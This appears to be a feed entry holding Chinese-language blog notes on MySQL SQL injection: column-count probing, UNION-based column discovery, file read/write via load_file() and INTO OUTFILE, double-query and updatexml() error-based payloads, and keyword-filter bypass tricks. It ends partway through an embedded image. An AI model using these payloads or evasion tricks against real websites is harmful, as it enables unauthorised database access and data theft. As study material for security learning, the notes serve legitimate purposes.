    <content type="html"><![CDATA[<ul><li>利用order by $column 探测字段数</li></ul><blockquote><p>在有报错信息的前提下，如果$column大于原来的字段数，则会报错</p></blockquote><ul><li>利用 union select 1,2,3… 猜解字段所在的列</li></ul><blockquote><p>select直接加数字串时，可以不写后面的表名，那么它输出的内容就是我们select后的数字，这时我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个1行n列的表，表的属性名和值都是我们输入的数组。</p></blockquote><ul><li>mysql注入读写文件</li></ul><blockquote><p>读取前提：<br>1.用户权限足够高，最好为root<br>2.secure_file_priv不为NULL（目的是可以利用mysql的函数）<br>写入前提：<br>1.用户权限足够高，最好为root<br>2.general_log = on<br>重要函数：<br>load_file()    读取任意文件<br>into outfile 关键字 写入文件</p></blockquote><ul><li>Double SQL Injection(双查询注入)</li></ul><blockquote><p>exp:<br>select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</p></blockquote><ul><li>常规sql绕过</li></ul><blockquote><p>1.sql对语句的大小写不敏感，可以大小写混合，如：uIoN<br> 2.mysql可以使用内联注释 /*!$expression*/ , 这样的sql语句也会执行。<br> 3.双写，添加注释。如：oorr,o/**/r<br> 4.等价代换，如：and -&gt; &amp;&amp; or -&gt; ||</p></blockquote><ul><li>UpdateXml()报错注入</li></ul><blockquote><p>exp:<br>and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><p>concat()函数是将其连成一个字符串,因此不会符合 XPATH string的格式,从而出现格式错误爆出用户<br>0x7e:~ upadtexmlo()报错信息为特殊字符、字母及之后的内容为了前面字母丢失开头连接一个特殊字符~<br>注：也可使用extractvalue()</p></blockquote><p>图示：<br><img src="data:image/png;base64,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